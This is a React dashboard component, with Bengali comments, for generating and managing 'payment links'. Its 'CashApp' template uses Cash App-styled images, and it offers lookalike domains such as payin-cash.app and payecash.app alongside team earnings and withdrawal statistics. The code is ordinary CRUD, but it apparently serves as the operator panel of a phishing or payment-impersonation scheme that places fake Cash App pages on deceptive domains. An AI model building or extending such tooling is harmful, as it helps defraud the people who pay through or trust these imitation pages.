import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { CreateQrForm } from './CreateQrForm';
import { Copy, Wallet, Users, Coins, Receipt, TrendingUp, PiggyBank, ArrowDownToLine, Link as LinkIcon, QrCode, BarChart2, User, Check, Trash2 } from "lucide-react";
import Swal from 'sweetalert2';

import imgGreen from '../asset/cashapp_green.png';
import imgLight from '../asset/cashapp_light.png';

export const DashboardCards = () => {
  const [paymentLinks, setPaymentLinks] = useState([]);
  const [linkIdInput, setLinkIdInput] = useState("");
  const [amount, setAmount] = useState("10");

  // ডাইনামিক্যালি বর্তমান ডোমেইন (लोকালহোস্ট বা ভেরসেল লাইভ লিংক) সেট করা হলো
  const [selectedDomain, setSelectedDomain] = useState(window.location.origin);
  const [newLinkTheme, setNewLinkTheme] = useState('light');

  const [stats, setStats] = useState({
    balance: "$0.00",
    myOwnEarnings: "$0.00",
    teamTotalEarnings: "$0.00",
    totalEarnings: "$0.00",
    totalWithdrawn: "$0.00"
  });

  // লোকাল এবং Vercel লাইভ সার্ভারের জন্য ডাইনামিক API বেস URL
  const API_URL = import.meta.env.MODE === 'production' ? '' : 'http://localhost:5000';

  useEffect(() => {
    fetchPaymentLinks();
    fetchStats();
  }, []);

  const fetchPaymentLinks = async () => {
    try {
      const response = await axios.get(`${API_URL}/api/payment-links`);
      const linksWithTheme = response.data.map(link => {
        const isGreen = link.theme === 'green';
        return {
          ...link,
          theme: link.theme || 'light',
          image: isGreen ? imgGreen : imgLight
        };
      });
      setPaymentLinks(linksWithTheme);
    } catch (error) {
      console.error("Error fetching payment links:", error);
    }
  };

  const fetchStats = async () => {
    try {
      const response = await axios.get(`${API_URL}/api/balance`);
      const data = response.data;
      setStats({
        balance: `$${(data.balance || 0).toLocaleString()}.00`,
        myOwnEarnings: `$${(data.myOwnEarnings || 0).toLocaleString()}.00`,
        teamTotalEarnings: `$${(data.teamTotalEarnings || 0).toLocaleString()}.00`,
        totalEarnings: `$${(data.totalEarnings || 0).toLocaleString()}.00`,
        totalWithdrawn: `$${(data.totalWithdrawn || 0).toLocaleString()}.00`
      });
    } catch (error) {
      console.error("Error fetching stats:", error);
    }
  };

  // নির্দিষ্ট কার্ডের থিম লোকাল স্টেটে পরিবর্তন করার হ্যান্ডলার
  const handleCardThemeChange = (id, newTheme) => {
    setPaymentLinks(prevLinks => 
      prevLinks.map(link => {
        if (link._id === id) {
          return { ...link, theme: newTheme, image: newTheme === 'green' ? imgGreen : imgLight };
        }
        return link;
      })
    );
  };

  // নতুন পেমেন্ট লিংক তৈরি করার ফাংশন (SweetAlert সহ)
  const handleCreateLink = async () => {
    if (!linkIdInput.trim()) {
      Swal.fire({
        icon: 'warning',
        title: 'Required',
        text: 'Please enter a name for the link ID!',
        confirmButtonColor: '#00D54B',
      });
      return;
    }

    const trimmedId = linkIdInput.trim();
    const finalUrl = `${selectedDomain}/${trimmedId}`;

    const newLinkData = {
      name: trimmedId,
      url: finalUrl,
      theme: newLinkTheme,
      amount: amount,
      createdAt: new Date()
    };

    try {
      const response = await axios.post(`${API_URL}/api/create-payment-link`, newLinkData);
      
      const createdItem = {
        ...response.data,
        theme: response.data.theme || newLinkTheme,
        image: (response.data.theme || newLinkTheme) === 'green' ? imgGreen : imgLight
      };

      setPaymentLinks([createdItem, ...paymentLinks]);
      setLinkIdInput(""); 
      
      Swal.fire({
        icon: 'success',
        title: 'Success!',
        text: 'Payment Link Created Successfully with selected theme!',
        confirmButtonColor: '#00D54B',
      });
    } catch (error) {
      console.error("Error creating link:", error);
      Swal.fire({
        icon: 'error',
        title: 'Oops...',
        text: 'Failed to save payment link',
        confirmButtonColor: '#00D54B',
      });
    }
  };

  // লিংক ডিলিট করার ফাংশন (SweetAlert Confirm সহ)
  const handleDeleteLink = async (id) => {
    Swal.fire({
      title: 'Are you sure?',
      text: "You won't be able to revert this!",
      icon: 'warning',
      showCancelButton: true,
      confirmButtonColor: '#d33',
      cancelButtonColor: '#3085d6',
      confirmButtonText: 'Yes, delete it!'
    }).then(async (result) => {
      if (result.isConfirmed) {
        try {
          await axios.delete(`${API_URL}/api/payment-links/${id}`);
          setPaymentLinks(prevLinks => prevLinks.filter(link => link._id !== id));
          Swal.fire(
            'Deleted!',
            'Payment Link Deleted Successfully!',
            'success'
          );
        } catch (error) {
          console.error("Error deleting link:", error);
          Swal.fire({
            icon: 'error',
            title: 'Error',
            text: 'Failed to delete payment link',
          });
        }
      }
    });
  };

  // ডাটাবেজে কার্ডের থিম ও সেটিংস সেভ করার ফাংশন
  const handleSaveCardSettings = async (link) => {
    try {
      await axios.put(`${API_URL}/api/payment-links/${link._id}`, {
        theme: link.theme,
        name: link.name,
        url: `${selectedDomain}/${link.name}`
      });
      
      Swal.fire({
        icon: 'success',
        title: 'Saved!',
        text: `Theme and settings saved successfully for ${link.name}!`,
        confirmButtonColor: '#00D54B',
        timer: 1500,
        showConfirmButton: false
      });
      
      fetchPaymentLinks();
    } catch (error) {
      console.error("Error updating link settings:", error);
      Swal.fire({
        icon: 'error',
        title: 'Error',
        text: 'Failed to save settings',
      });
    }
  };

  return (
    <div className="p-8 bg-gray-50 min-h-screen">
      <h1 className="text-3xl font-bold mb-1">Dashboard</h1>
      
      <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-4 mb-6">
        <StatCard title="AVAILABLE BALANCE" amount={stats.balance} icon={<Wallet className="text-green-500" />} />
        <StatCard title="MY OWN EARNINGS" amount={stats.myOwnEarnings} icon={<PiggyBank className="text-green-500" />} />
        <StatCard title="TEAM TOTAL EARNINGS" amount={stats.teamTotalEarnings} icon={<Users className="text-green-500" />} />
        <StatCard title="TOTAL EARNINGS" amount={stats.totalEarnings} icon={<Coins className="text-green-500" />} />
        <StatCard title="TOTAL WITHDRAWN" amount={stats.totalWithdrawn} icon={<ArrowDownToLine className="text-green-500" />} />
        <StatCard title="TOTAL BILLABLE" amount="$0.00" icon={<Receipt className="text-green-500" />} />
        <StatCard title="TOTAL SETTLED" amount="0" icon={<TrendingUp className="text-green-500" />} />
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
        <CreateQrForm />

        <div className="space-y-6">
          <div className="flex justify-between items-center bg-white p-4 rounded-2xl border border-gray-100 shadow-sm">
            <h2 className="text-lg font-bold text-gray-800">Payment Link</h2>
            <select 
              value={selectedDomain}
              onChange={(e) => setSelectedDomain(e.target.value)}
              className="px-4 py-2 bg-gray-50 border border-green-500 rounded-xl text-sm font-medium text-gray-700 outline-none focus:ring-2 focus:ring-green-100 cursor-pointer shadow-sm"
            >
              <option value={window.location.origin}>{window.location.origin}</option>
              <option value="https://www.payecash.app">https://www.payecash.app</option>
              <option value="https://www.payin-cash.app">https://www.payin-cash.app</option>
            </select>
          </div>

          {paymentLinks.map((item) => {
            const currentLinkDisplay = `${selectedDomain}/${item.name}`;
            const isGreenTheme = item.theme === 'green';

            return (
              <div key={item._id} className="bg-white p-5 rounded-2xl border border-gray-100 shadow-sm space-y-4">
                <div className="flex items-center justify-between gap-4">
                  <div className="flex items-center gap-3 overflow-hidden">
                    <div className={`w-16 h-12 rounded-xl border flex items-center justify-center p-1 shadow-sm overflow-hidden ${isGreenTheme ? 'bg-green-500' : 'bg-gray-100'}`}>
                      <img 
                        src={isGreenTheme ? imgGreen : imgLight} 
                        alt="Theme Preview" 
                        className="w-full h-full object-cover rounded-lg" 
                      />
                    </div>
                    <div className="truncate">
                      <p className="text-xs text-gray-500 truncate flex items-center gap-1 font-medium">
                        <LinkIcon size={12} /> {currentLinkDisplay}
                      </p>
                    </div>
                  </div>

                  <div className="flex items-center gap-2">
                    <button 
                      onClick={() => { 
                        navigator.clipboard.writeText(currentLinkDisplay); 
                        Swal.fire({
                          icon: 'success',
                          title: 'Copied!',
                          text: 'Link Copied to clipboard!',
                          timer: 1200,
                          showConfirmButton: false,
                        }); 
                      }} 
                      className="p-2 bg-green-50 hover:bg-green-100 text-green-600 rounded-xl transition flex-shrink-0 cursor-pointer"
                      title="Copy Link"
                    >
                      <Copy size={16}/>
                    </button>

                    <button 
                      onClick={() => handleDeleteLink(item._id)} 
                      className="p-2 bg-red-50 hover:bg-red-100 text-red-600 rounded-xl transition flex-shrink-0 cursor-pointer"
                      title="Delete Link"
                    >
                      <Trash2 size={16}/>
                    </button>
                  </div>
                </div>

                <div className="flex items-center justify-between pt-3 border-t border-gray-100">
                  <div>
                    <span className="text-[10px] text-gray-400 font-bold uppercase tracking-wider block">TEMPLATE</span>
                    <span className="text-xs font-bold text-gray-800">
                      {isGreenTheme ? 'CashApp' : 'Default'}
                    </span>
                  </div>

                  <div className="flex items-center gap-2">
                    <button className="p-2 bg-gray-50 hover:bg-gray-100 text-gray-600 rounded-lg transition cursor-pointer" title="QR Code">
                      <QrCode size={16} />
                    </button>

                    <button className="p-2 bg-gray-50 hover:bg-gray-100 text-gray-600 rounded-lg transition cursor-pointer" title="Analytics">
                      <BarChart2 size={16} />
                    </button>

                    <button 
                      onClick={() => handleCardThemeChange(item._id, isGreenTheme ? 'light' : 'green')}
                      className={`px-3 py-1.5 rounded-lg text-xs font-bold transition cursor-pointer flex items-center gap-1 ${
                        isGreenTheme 
                          ? 'bg-green-500 text-white shadow-sm' 
                          : 'bg-gray-900 text-white'
                      }`}
                      title="Toggle Theme"
                    >
                      {isGreenTheme ? 'CashApp' : 'Default'}
                    </button>

                    <button className="p-2 bg-gray-50 hover:bg-gray-100 text-gray-600 rounded-lg transition cursor-pointer" title="User View">
                      <User size={16} />
                    </button>

                    <button 
                      onClick={() => handleSaveCardSettings(item)}
                      className="px-4 py-1.5 bg-green-500 hover:bg-green-600 text-white text-xs font-bold rounded-lg transition cursor-pointer shadow-sm flex items-center gap-1"
                    >
                      <Check size={14} /> Save
                    </button>
                  </div>
                </div>
              </div>
            );
          })}

          <div className="bg-white p-8 rounded-3xl border border-gray-100 shadow-lg shadow-gray-100/50 space-y-5">
            <div>
              <label className="block text-xs font-bold text-gray-800 uppercase tracking-wider mb-2">Link ID (text)</label>
              <input 
                type="text" 
                placeholder="e.g. Stephanie" 
                value={linkIdInput}
                onChange={(e) => setLinkIdInput(e.target.value)}
                className="w-full p-4 bg-gray-50 rounded-2xl border border-gray-200 outline-none focus:border-green-500 focus:ring-2 focus:ring-green-100 transition-all font-medium text-sm" 
              />
              <p className="text-[11px] text-gray-400 mt-1.5">This will be your unique payment URL based on selected domain.</p>
            </div>

            <div>
              <label className="block text-xs font-bold text-gray-800 uppercase tracking-wider mb-2">Select Initial Theme</label>
              <div className="flex gap-4">
                <button
                  type="button"
                  onClick={() => setNewLinkTheme('light')}
                  className={`flex-1 py-3 rounded-xl font-bold text-xs border-2 transition cursor-pointer ${newLinkTheme === 'light' ? 'border-green-500 bg-green-50 text-green-700' : 'border-gray-200 text-gray-600'}`}
                >
                  Default (Light)
                </button>
                <button
                  type="button"
                  onClick={() => setNewLinkTheme('green')}
                  className={`flex-1 py-3 rounded-xl font-bold text-xs border-2 transition cursor-pointer ${newLinkTheme === 'green' ? 'border-green-500 bg-green-50 text-green-700' : 'border-gray-200 text-gray-600'}`}
                >
                  CashApp (Green)
                </button>
              </div>
            </div>

            <button 
              onClick={handleCreateLink}
              className="w-full bg-green-500 text-white py-4 rounded-2xl font-bold hover:bg-green-600 transition-all duration-300 transform hover:scale-[1.01] active:scale-95 shadow-lg shadow-green-100 cursor-pointer"
            >
              Create New Link
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

const StatCard = ({ title, amount, icon }) => (
  <div className="bg-white p-5 rounded-2xl shadow-sm border border-gray-100">
    <div className="mb-2">{icon}</div>
    <p className="text-[10px] tracking-wider text-gray-400 font-bold mb-1">{title}</p>
    <h3 className="text-2xl font-bold text-gray-800">{amount}</h3>
  </div>
);